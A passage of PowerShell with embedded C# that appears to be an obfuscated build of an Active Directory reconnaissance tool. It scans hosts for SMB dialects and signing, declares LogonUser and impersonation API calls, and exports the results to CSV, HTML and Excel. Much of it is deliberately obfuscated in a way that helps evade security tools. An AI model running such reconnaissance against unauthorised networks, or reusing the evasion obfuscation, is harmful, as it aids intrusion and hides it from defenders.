                            ObjectObj.Members.Add(new PSNoteProperty("AuditFlags", Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
"@


$PingCastleSMBScannerSource = @"

        [StructLayout(LayoutKind.Explicit)]
		struct SMB_Header {
			[FieldOffset(0)]
			public UInt32 Protocol;
			[FieldOffset(4)]
			public byte Command;
			[FieldOffset(5)]
			public int Status;
			[FieldOffset(9)]
			public byte  Flags;
			[FieldOffset(10)]
			public UInt16 Flags2;
			[FieldOffset(12)]
			public UInt16 PIDHigh;
			[FieldOffset(14)]
			public UInt64 SecurityFeatures;
			[FieldOffset(22)]
			public UInt16 Reserved;
			[FieldOffset(24)]
			public UInt16 TID;
			[FieldOffset(26)]
			public UInt16 PIDLow;
			[FieldOffset(28)]
			public UInt16 UID;
			[FieldOffset(30)]
			public UInt16 MID;
		};
		// https://msdn.microsoft.com/en-us/library/cc246529.aspx
		[StructLayout(LayoutKind.Explicit)]
		struct SMB2_Header {
			[FieldOffset(0)]
			public UInt32 ProtocolId;
			[FieldOffset(4)]
			public UInt16 StructureSize;
			[FieldOffset(6)]
			public UInt16 CreditCharge;
			[FieldOffset(8)]
			public UInt32 Status; // to do SMB3
			[FieldOffset(12)]
			public UInt16 Command;
			[FieldOffset(14)]
			public UInt16 CreditRequest_Response;
			[FieldOffset(16)]
			public UInt32 Flags;
			[FieldOffset(20)]
			public UInt32 NextCommand;
			[FieldOffset(24)]
			public UInt64 MessageId;
			[FieldOffset(32)]
			public UInt32 Reserved;
			[FieldOffset(36)]
			public UInt32 TreeId;
			[FieldOffset(40)]
			public UInt64 SessionId;
			[FieldOffset(48)]
			public UInt64 Signature1;
			[FieldOffset(56)]
			public UInt64 Signature2;
		}
        [StructLayout(LayoutKind.Explicit)]
		struct SMB2_NegotiateRequest
		{
			[FieldOffset(0)]
			public UInt16 StructureSize;
			[FieldOffset(2)]
			public UInt16 DialectCount;
			[FieldOffset(4)]
			public UInt16 SecurityMode;
			[FieldOffset(6)]
			public UInt16 Reserved;
			[FieldOffset(8)]
			public UInt32 Capabilities;
			[FieldOffset(12)]
			public Guid ClientGuid;
			[FieldOffset(28)]
			public UInt64 ClientStartTime;
			[FieldOffset(36)]
			public UInt16 DialectToTest;
		}
		const int SMB_COM_NEGOTIATE	= 0x72;
		const int SMB2_NEGOTIATE = 0;
		const int SMB_FLAGS_CASE_INSENSITIVE = 0x08;
		const int SMB_FLAGS_CANONICALIZED_PATHS = 0x10;
		const int SMB_FLAGS2_LONG_NAMES					= 0x0001;
		const int SMB_FLAGS2_EAS							= 0x0002;
		const int SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED	= 0x0010	;
		const int SMB_FLAGS2_IS_LONG_NAME					= 0x0040;
		const int SMB_FLAGS2_ESS							= 0x0800;
		const int SMB_FLAGS2_NT_STATUS					= 0x4000;
		const int SMB_FLAGS2_UNICODE						= 0x8000;
		const int SMB_DB_FORMAT_DIALECT = 0x02;
		static byte[] GenerateSmbHeaderFromCommand(byte command)
		{
			SMB_Header header = new SMB_Header();
			header.Protocol = 0x424D53FF;
			header.Command = command;
			header.Status = 0;
			header.Flags = SMB_FLAGS_CASE_INSENSITIVE | SMB_FLAGS_CANONICALIZED_PATHS;
			header.Flags2 = SMB_FLAGS2_LONG_NAMES | SMB_FLAGS2_EAS | SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED | SMB_FLAGS2_IS_LONG_NAME | SMB_FLAGS2_ESS | SMB_FLAGS2_NT_STATUS | SMB_FLAGS2_UNICODE;
			header.PIDHigh = 0;
			header.SecurityFeatures = 0;
			header.Reserved = 0;
			header.TID = 0xffff;
			header.PIDLow = 0xFEFF;
			header.UID = 0;
			header.MID = 0;
			return getBytes(header);
		}
		static byte[] GenerateSmb2HeaderFromCommand(byte command)
		{
			SMB2_Header header = new SMB2_Header();
			header.ProtocolId = 0x424D53FE;
			header.Command = command;
			header.StructureSize = 64;
			header.Command = command;
			header.MessageId = 0;
			header.Reserved = 0xFEFF;
			return getBytes(header);
		}
		static byte[] getBytes(object structure)
		{
			int size = Marshal.SizeOf(structure);
			byte[] arr = new byte[size];
			IntPtr ptr = Marshal.AllocHGlobal(size);
			Marshal.StructureToPtr(structure, ptr, true);
			Marshal.Copy(ptr, arr, 0, size);
			Marshal.FreeHGlobal(ptr);
			return arr;
		}
		static byte[] getDialect(string dialect)
		{
			byte[] dialectBytes = Encoding.ASCII.GetBytes(dialect);
			byte[] output = new byte[dialectBytes.Length + 2];
			output[0] = 2;
			output[output.Length - 1] = 0;
			Array.Copy(dialectBytes, 0, output, 1, dialectBytes.Length);
			return output;
		}
		static byte[] GetNegotiateMessage(byte[] dialect)
		{
			byte[] output = new byte[dialect.Length + 3];
			output[0] = 0;
			output[1] = (byte) dialect.Length;
			output[2] = 0;
			Array.Copy(dialect, 0, output, 3, dialect.Length);
			return output;
		}
		// MS-SMB2  2.2.3 SMB2 NEGOTIATE Request
		static byte[] GetNegotiateMessageSmbv2(int DialectToTest)
		{
			SMB2_NegotiateRequest request = new SMB2_NegotiateRequest();
			request.StructureSize = 36;
			request.DialectCount = 1;
			request.SecurityMode = 1; // signing enabled
			request.ClientGuid = Guid.NewGuid();
			request.DialectToTest = (UInt16) DialectToTest;
			return getBytes(request);
		}
		static byte[] GetNegotiatePacket(byte[] header, byte[] smbPacket)
		{
			byte[] output = new byte[smbPacket.Length + header.Length + 4];
			output[0] = 0;
			output[1] = 0;
			output[2] = 0;
			output[3] = (byte)(smbPacket.Length + header.Length);
			Array.Copy(header, 0, output, 4, header.Length);
			Array.Copy(smbPacket, 0, output, 4 + header.Length, smbPacket.Length);
			return output;
		}
		public static bool DoesServerSupportDialect(string server, string dialect)
		{
			Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect);
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception("port 445 is closed on " + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmbHeaderFromCommand(SMB_COM_NEGOTIATE);
				byte[] dialectEncoding = getDialect(dialect);
				byte[] negotiatemessage = GetNegotiateMessage(dialectEncoding);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if (stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				byte[] negotiateresponse = new byte[3];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
				if (negotiateresponse[1] == 0 && negotiateresponse[2] == 0)
				{
					Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect + " = Supported");
					return true;
				}
				Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect + " = Not supported");
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException("Smb1 is not supported on " + server);
			}
		}
		public static bool DoesServerSupportDialectWithSmbV2(string server, int dialect, bool checkSMBSigning)
		{
			Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2"));
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception("port 445 is closed on " + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmb2HeaderFromCommand(SMB2_NEGOTIATE);
				byte[] negotiatemessage = GetNegotiateMessageSmbv2(dialect);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if( stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB2_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				if (smbHeader[8] != 0 || smbHeader[9] != 0 || smbHeader[10] != 0 || smbHeader[11] != 0)
				{
					Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Not supported via error code");
					return false;
				}
				byte[] negotiateresponse = new byte[6];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
                if (checkSMBSigning)
                {
                    // https://support.microsoft.com/en-in/help/887429/overview-of-server-message-block-signing
                    // https://msdn.microsoft.com/en-us/library/cc246561.aspx
				    if (negotiateresponse[2] == 3)
				    {
					    Trace.WriteLine("Checking " + server + " for SMBV2 SMB Signing dialect 0x" + dialect.ToString("X2") + " = Supported");
					    return true;
				    }
                    else
                    {
                        return false;
                    }
                }
				int selectedDialect = negotiateresponse[5] * 0x100 + negotiateresponse[4];
				if (selectedDialect == dialect)
				{
					Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Supported");
					return true;
				}
				Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Not supported via not returned dialect");
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException("Smb2 is not supported on " + server);
			}
		}
		public static bool SupportSMB1(string server)
		{
			try
			{
				return DoesServerSupportDialect(server, "NT LM 0.12");
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB2(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0202, false) || DoesServerSupportDialectWithSmbV2(server, 0x0210, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB3(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0300, false) || DoesServerSupportDialectWithSmbV2(server, 0x0302, false) || DoesServerSupportDialectWithSmbV2(server, 0x0311, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static string Name { get { return "smb"; } }
		public static PSObject GetPSObject(Object IPv4Address)
		{
            string computer = Convert.ToString(IPv4Address);
            PSObject DCSMBObj = new PSObject();
            if (computer == "")
            {
                DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                return DCSMBObj;
            }
            bool isPortOpened = true;
			bool SMBv1 = false;
			bool SMBv2_0x0202 = false;
			bool SMBv2_0x0210 = false;
			bool SMBv3_0x0300 = false;
			bool SMBv3_0x0302 = false;
			bool SMBv3_0x0311 = false;
            bool SMBSigning = false;
			try
			{
				try
				{
					SMBv1 = DoesServerSupportDialect(computer, "NT LM 0.12");
				}
				catch (ApplicationException)
				{
				}
				try
				{
					SMBv2_0x0202 = DoesServerSupportDialectWithSmbV2(computer, 0x0202, false);
					SMBv2_0x0210 = DoesServerSupportDialectWithSmbV2(computer, 0x0210, false);
					SMBv3_0x0300 = DoesServerSupportDialectWithSmbV2(computer, 0x0300, false);
					SMBv3_0x0302 = DoesServerSupportDialectWithSmbV2(computer, 0x0302, false);
					SMBv3_0x0311 = DoesServerSupportDialectWithSmbV2(computer, 0x0311, false);
				}
				catch (ApplicationException)
				{
				}
			}
			catch (Exception)
			{
				isPortOpened = false;
			}
			if (SMBv3_0x0311)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0311, true);
			}
			else if (SMBv3_0x0302)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0302, true);
			}
			else if (SMBv3_0x0300)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0300, true);
			}
			else if (SMBv2_0x0210)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0210, true);
			}
			else if (SMBv2_0x0202)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0202, true);
			}
            DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", isPortOpened));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", SMBv1));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", SMBv2_0x0202));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", SMBv2_0x0210));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", SMBv3_0x0300));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", SMBv3_0x0302));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", SMBv3_0x0311));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB Signing", SMBSigning));
            return DCSMBObj;
		}
	}
}
"@







$Advapi32Def = (((("{26}{2}{42}{81}{93}{92}{60}{29}{59}{25}{78}{95}{71}{13}{7}{84}{90}{70}{43}{54}{33}{12}{87}{46}{45}{53}{75}{64}{88}{36}{32}{47}{14}{23}{58}{83}{76}{37}{21}{65}{62}{35}{30}{91}{50}{0}{73}{49}{68}{79}{82}{24}{51}{8}{16}{34}{38}{20}{57}{86}{9}{6}{74}{10}{67}{3}{40}{56}{5}{17}{44}{31}{69}{61}{1}{41}{39}{52}{72}{55}{89}{11}{22}{28}{94}{63}{85}{77}{19}{48}{66}{18}{80}{4}{15}{27}"-f'tr phToke','er(In','   [Dll','blic st','lf();','tern bo',' ',' stati','i32','or =','
   ','  ','User(st','ublic','ai','
','.dll','ol I','evertToS',']
    public st',' S',' int dwL',' [DllIm','n','xw','etLa','MSw
 ','MSw','p','w, ','r,','gged','ps',' Logon','Ax','Provide',' l','pe,','w,','h','a','tPtr ','Import','tern boo','mpersonateLo','s','lpszU','zDom','atic extern bo',');

 ','P','advap','Toke','ern','l','

','tic ex','e',', string lpszPassword, int ','S','lAx','s','gon','wadvapi32','e, ','o','ol R',' pu','   [Dl','OnU','x','ror = true)]
    p','n);','n','true)]','am','y','rue)','s','lImpor','e','(Axw','t(A','dwLogonT','c ','.dllAxw, SetLastError = t','tLastErr','ring ','string',' ','e',' out Int','i32.dl','advap','ort(Ax','tEr')) -crePlace([chAR]77+[chAR]83+[chAR]119),[chAR]39-rEPlACE([chAR]65+[chAR]120+[chAR]119),[chAR]34))



$Kernel32Def = ((("{1}{17}{13}{31}{11}{8}{15}{30}{4}{27}{25}{23}{29}{10}{20}{6}{18}{9}{14}{28}{0}{5}{12}{22}{19}{7}{21}{24}{26}{2}{3}{16}" -f '  ','{0}
 ','e(IntPt','r ','ernel32.','public sta',' t','rn b','({','ue)','r','t','t','lI',']
 ','1}','hObject);
{0}','   [Dl','r','c exte','or =','ool','i','l{1}, SetL',' CloseHand','l','l','d',' ','astEr','k','mpor'))-f[ChaR]39,[ChaR]34)

Function Get-DateDiff
{

    param (
        [Parameter(MaNDatORy = $true)]
        [DateTime] $Date1,

        [Parameter(MaNdATORy = $true)]
        [DateTime] $Date2
    )

    If ($Date2 -gt $Date1)
    {
        $DDiff = $Date2 - $Date1
    }
    Else
    {
        $DDiff = $Date1 - $Date2
    }
    Return $DDiff
}

Function Get-DNtoFQDN
{

    param(
        [Parameter(maNdAtoRY = $true)]
        [string] $ADObjectDN
    )

    $Index = $ADObjectDN.("{1}{0}"-f 'exOf','Ind').Invoke('DC=')
    If ($Index)
    {
        $ADObjectDNDomainName = $($ADObjectDN.("{2}{0}{1}{3}" -f'u','bStrin','S','g').Invoke($Index)) -replace 'DC=','' -replace ',','.'
    }
    Else
    {
        
        [array] $ADObjectDNArray = $ADObjectDN -Split ("DC=")
        $ADObjectDNArray | ForEach-Object {
            [array] $temp = $_ -Split (",")
            [string] $ADObjectDNArrayItemDomainName += $temp[0] + "."
        }
        $ADObjectDNDomainName = $ADObjectDNArrayItemDomainName.("{2}{0}{1}" -f 'ubs','tring','S').Invoke(1, $ADObjectDNArrayItemDomainName."leN`gth" - 2)
    }
    Return $ADObjectDNDomainName
}

Function Export-ADRCSV
{

    param(
        [Parameter(maNDATOrY = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(ManDATOry = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName
    )

    Try
    {
        $ADRObj | Export-Csv -Path $ADFileName -NoTypeInformation -Encoding Default
    }
    Catch
    {
        Write-Warning "[Export-ADRCSV] Failed to export $($ADFileName). "
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function Export-ADRXML
{

    param(
        [Parameter(mAndaTORY = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(maNdatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName
    )

    Try
    {
        (ConvertTo-Xml -NoTypeInformation -InputObject $ADRObj).("{0}{1}"-f'Sav','e').Invoke($ADFileName)
    }
    Catch
    {
        Write-Warning "[Export-ADRXML] Failed to export $($ADFileName). "
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function Export-ADRJSON
{

    param(
        [Parameter(mAndatORy = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(mANDAtoRy = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName
    )

    Try
    {
        ConvertTo-JSON -InputObject $ADRObj | Out-File -FilePath $ADFileName
    }
    Catch
    {
        Write-Warning "[Export-ADRJSON] Failed to export $($ADFileName). "
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function Export-ADRHTML
{

    param(
        [Parameter(mANdAToRY = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(MandATORY = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName,

        [Parameter(mAndaTORY = $false)]
        [String] $ADROutputDir = $null
    )

$Header = @"
<style type="text/css">
th {
	color:white;
	background-color:blue;
}
td, th {
	border:0px solid black;
	border-collapse:collapse;
	white-space:pre;
}
tr:nth-child(2n+1) {
    background-color: #dddddd;
}
tr:hover td {
    background-color: #c1d5f8;
}
table, tr, td, th {
	padding: 0px;
	margin: 0px;
	white-space:pre;
}
table {
	margin-left:1px;
}
</style>
"@
    Try
    {
        If ($ADFileName.("{2}{1}{0}"-f 's','tain','Con').Invoke(("{1}{0}"-f'x','Inde')))
        {
            $HTMLPath  = -join($ADROutputDir,'\',("{2}{1}{0}" -f 'L-Files','M','HT'))
            $HTMLPath = $((Convert-Path $HTMLPath).("{2}{0}{1}"-f'im','End','Tr').Invoke("\"))
            $HTMLFiles = Get-ChildItem -Path $HTMLPath -name
            $HTML = $HTMLFiles | ConvertTo-HTML -Title ("{0}{1}"-f 'A','DRecon') -Property @{("{1}{0}"-f 'bel','La')=("{2}{1}{0}{3}{4}{5}" -f'Con',' of ','Table','t','e','nts');("{1}{2}{0}" -f 'n','Expres','sio')={"<a href='$($_)'>$($_)</a> "}} -Head $Header

            Add-Type -AssemblyName System.Web
              $mJV1H::("{1}{2}{0}"-f 'lDecode','H','tm').Invoke($HTML) | Out-File -FilePath $ADFileName
        }
        Else
        {
            If ($ADRObj -is [array])
            {
                $ADRObj | Select-Object * | ConvertTo-HTML -As Table -Head $Header | Out-File -FilePath $ADFileName
            }
            Else
            {
                ConvertTo-HTML -InputObject $ADRObj -As Table -Head $Header | Out-File -FilePath $ADFileName
            }
        }
    }
    Catch
    {
        Write-Warning "[Export-ADRHTML] Failed to export $($ADFileName). "
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function Export-ADR
{

    param(
        [Parameter(MAndatORy = $true)]
        [PSObject] $ADRObj,

        [Parameter(MaNdaTOry = $true)]
        [String] $ADROutputDir,

        [Parameter(mandatoRy = $true)]
        [array] $OutputType,

        [Parameter(MANDaToRY = $true)]
        [String] $ADRModuleName
    )

    Switch ($OutputType)
    {
        ("{0}{1}"-f'ST','DOUT')
        {
            If ($ADRModuleName -ne ("{1}{2}{3}{0}"-f'econ','Abo','u','tADR'))
            {
                If ($ADRObj -is [array])
                {
                    
                    $ADRObj | Out-String -Stream
                }
                Else
                {
                    
                    $ADRObj | Format-List | Out-String -Stream
                }
            }
        }
        'CSV'
        {
            $ADFileName  = -join($ADROutputDir,'\',("{0}{1}{2}"-f'C','SV-','Files'),'\',$ADRModuleName,("{1}{0}" -f'v','.cs'))
            Export-ADRCSV -ADRObj $ADRObj -ADFileName $ADFileName
        }
        'XML'
        {
            $ADFileName  = -join($ADROutputDir,'\',("{0}{1}" -f 'XML-','Files'),'\',$ADRModuleName,("{0}{1}"-f'.','xml'))
            Export-ADRXML -ADRObj $ADRObj -ADFileName $ADFileName
        }
        ("{0}{1}"-f'JS','ON')
        {
            $ADFileName  = -join($ADROutputDir,'\',("{0}{3}{1}{2}" -f 'JSO','il','es','N-F'),'\',$ADRModuleName,("{0}{1}" -f'.jso','n'))
            Export-ADRJSON -ADRObj $ADRObj -ADFileName $ADFileName
        }
        ("{1}{0}" -f'L','HTM')
        {
            $ADFileName  = -join($ADROutputDir,'\',("{1}{2}{0}"-f'es','HTML-F','il'),'\',$ADRModuleName,("{0}{1}" -f '.htm','l'))
            Export-ADRHTML -ADRObj $ADRObj -ADFileName $ADFileName -ADROutputDir $ADROutputDir
        }
    }
}

Function Get-ADRExcelComObj
{


    
    Try
    {
        
        $SaveVerbosePreference = $script:VerbosePreference
        $script:VerbosePreference = ("{1}{2}{0}{3}"-f 'n','Si','le','tlyContinue')
        $global:excel = New-Object -ComObject excel.application
        If ($SaveVerbosePreference)
        {
            $script:VerbosePreference = $SaveVerbosePreference
            Remove-Variable SaveVerbosePreference
        }
    }
    Catch
    {
        If ($SaveVerbosePreference)
        {
            $script:VerbosePreference = $SaveVerbosePreference
            Remove-Variable SaveVerbosePreference
        }
        Write-Warning ("{6}{8}{30}{0}{41}{36}{35}{13}{25}{18}{42}{9}{26}{39}{16}{33}{38}{29}{19}{31}{7}{10}{23}{5}{21}{1}{2}{17}{14}{3}{12}{24}{34}{15}{32}{20}{11}{22}{37}{28}{40}{4}{27}" -f'bj] Excel does not appe','ra','te','ort','lled','rameter ','[G','enExce','et-ADR','p','l ','o','.xslx o',' b','p','host with','eneration o',' the ADRecon-Re','alle','eport.xlsx. Use t','cros','to gene','ft Exce','pa','n a','e inst','pin','.','s','R','ExcelComO','he -G',' Mi','f',' ',' to','r','l in',' ADRecon-','g g','ta','a','d. Ski')
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        Return $null
    }
    $excel."v`I`sIBLe" = $true
    $excel."I`NtE`Ra`ctIve" = $false
    $global:workbook = $excel."WO`RK`BOOkS".("{0}{1}" -f'A','dd').Invoke()
    If ($workbook."W`OR`KsHEeTS"."C`oUNt" -eq 3)
    {
        $workbook."w`OR`kS`hEetS".("{0}{1}" -f'It','em').Invoke(3).("{0}{1}{2}"-f'D','e','lete').Invoke()
        $workbook."wOR`k`SHEe`TS".("{1}{0}"-f'm','Ite').Invoke(2).("{0}{2}{1}" -f 'D','e','elet').Invoke()
    }
}

Function Get-ADRExcelComObjRelease
{

    param(
        [Parameter(mAndaTORY = $true)]
        $ComObjtoRelease,

        [Parameter(ManDAtoRY = $false)]
        [bool] $Final = $false
    )
    
    
    If ($Final)
    {
         ( varIaBLe  hlXC ).ValUE::("{1}{4}{3}{0}{2}" -f 'aseComObje','FinalR','ct','le','e').Invoke($ComObjtoRelease) | Out-Null
    }
    Else
    {
          $HLxc::("{1}{0}{3}{2}"-f 'le','Re','Object','aseCom').Invoke($ComObjtoRelease) | Out-Null
    }
      ( Gi  ("VAr"+"IABL"+"e:"+"t"+"j38Q0")).Value::("{2}{0}{1}" -f'olle','ct','C').Invoke()
     (  GET-itEm  vARiable:tJ38Q0  ).VAlUE::("{1}{0}{3}{2}{4}"-f 'itForPe','Wa','dingFin','n','alizers').Invoke()
}

Function Get-ADRExcelWorkbook
{

    param (
        [Parameter(MANDatORy = $true)]
        [string] $name
    )

    $workbook."W`O`RKSheETS".("{1}{0}"-f 'd','Ad').Invoke() | Out-Null
    $worksheet = $workbook."w`ORKsHeE`Ts".("{0}{1}" -f 'It','em').Invoke(1)
    $worksheet."n`Ame" = $name

    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelImport
{

    param (
        [Parameter(MaNdaToRY = $true)]
        [string] $ADFileName,

        [Parameter(maNDAToRy = $false)]
        [int] $Method = 1,

        [Parameter(mAndaTORy = $false)]
        [int] $row = 1,

        [Parameter(mANDATory = $false)]
        [int] $column = 1
    )

    $excel."s`cR`eE`NuPDATinG" = $false
    If ($Method -eq 1)
    {
        If (Test-Path $ADFileName)
        {
            $worksheet = $workbook."WOR`KS`HEE`TS".("{1}{0}"-f'em','It').Invoke(1)
            $TxtConnector = (("{1}{0}"-f';','TEXT') + $ADFileName)
            $CellRef = $worksheet.("{0}{1}"-f 'Ra','nge').Invoke("A1")
            
            $Connector = $worksheet."QUe`Ryt`A`BLeS".("{1}{0}"-f'd','ad').Invoke($TxtConnector, $CellRef)

            
            $worksheet."Query`TaB`les".("{0}{1}" -f'it','em').Invoke($Connector."NA`me")."TEXtfil`EpLaTf`O`RM" = 65001
            $worksheet."Q`UER`Ytabl`Es".("{1}{0}" -f 'm','ite').Invoke($Connector."nA`Me")."tExTfiL`ECoMmA`d`elIm`iter" = $True
            $worksheet."Que`RYTabl`Es".("{1}{0}" -f 'tem','i').Invoke($Connector."n`AME")."TEx`Tfi`lePAR`setyPE" = 1
            $worksheet."Qu`ERyTa`BlEs".("{0}{1}"-f 'i','tem').Invoke($Connector."N`Ame").("{1}{2}{0}" -f 'h','Refr','es').Invoke() | Out-Null
            $worksheet."QuE`RYT`A`Bles".("{1}{0}"-f 'em','it').Invoke($Connector."na`Me").("{1}{0}"-f'ete','del').Invoke()

            Get-ADRExcelComObjRelease -ComObjtoRelease $CellRef
            Remove-Variable CellRef
            Get-ADRExcelComObjRelease -ComObjtoRelease $Connector
            Remove-Variable Connector

            $listObject = $worksheet."LIstoBjE`C`Ts"."a`DD"(  $5yH::"xlsRcR`An`gE", $worksheet."Use`drA`Nge", $null,   ( Ls  VaRIAblE:5u4  ).VAlUE::"xLy`ES", $null)
            $listObject."tA`BleSTy`le" = ("{1}{3}{4}{2}{0}"-f 'eLight2','Tabl','yl','eS','t') 
            $worksheet."u`sEdRaN`GE"."E`NTiReco`LU`mn".("{0}{1}{2}" -f 'Aut','oFi','t').Invoke() | Out-Null
        }
        Remove-Variable ADFileName
    }
    Elseif ($Method -eq 2)
    {
        $worksheet = $workbook."wOr`K`shEetS".("{0}{1}" -f 'Ite','m').Invoke(1)
        If (Test-Path $ADFileName)
        {
            $ADTemp = Import-Csv -Path $ADFileName
            $ADTemp | ForEach-Object {
                Foreach ($prop in $_."PSObJ`ECt"."pro`PerT`IeS")
                {
                    $worksheet."CE`LlS".("{1}{0}"-f'em','It').Invoke($row, $column) = $prop."N`AmE"
                    $worksheet."c`Ells".("{1}{0}" -f'em','It').Invoke($row, $column + 1) = $prop."VA`LUE"
                    $row++
                }
            }
            Remove-Variable ADTemp
            $listObject = $worksheet."li`stoBJE`cts"."a`Dd"( $5yh::"XLS`RCR`AN`gE", $worksheet."US`Ed`RANge", $null,  ( Gi  VarIAblE:5u4 ).vALUe::"X`LYEs", $null)
            $listObject."tab`le`St`yLe" = ("{1}{2}{0}{3}"-f'Li','Ta','bleStyle','ght2') 
            $usedRange = $worksheet."u`S`edRaNge"
            $usedRange."eNtIRe`c`oL`Umn".("{0}{2}{1}"-f 'Au','oFit','t').Invoke() | Out-Null
        }
        Else
        {
            $worksheet."cEl`LS".("{0}{1}"-f 'It','em').Invoke($row, $column) = ("{0}{1}"-f 'Erro','r!')
        }
        Remove-Variable ADFileName
    }
    $excel."sCreeN`UpD`AT`Ing" = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}


Function Get-ADRExcelPivotTable
{

    param (
